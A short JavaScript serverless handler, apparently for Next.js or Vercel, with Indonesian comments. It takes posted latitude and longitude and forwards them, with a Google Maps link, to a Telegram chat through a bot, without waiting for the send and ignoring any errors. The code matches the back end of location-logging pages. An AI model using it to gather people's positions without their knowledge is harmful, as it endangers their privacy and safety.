export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end();
  }

  try {
    const { lat, lon } = req.body;

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const text = `📍 Lokasi baru:
Lat: ${lat}
Lon: ${lon}
https://maps.google.com/?q=${lat},${lon}`;

    // kirim ke Telegram TANPA await (biar super cepat)
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    }).catch(() => {});

    // langsung respon
    return res.status(200).json({ ok: true });

  } catch (err) {
    return res.status(200).json({ ok: false });
  }
}
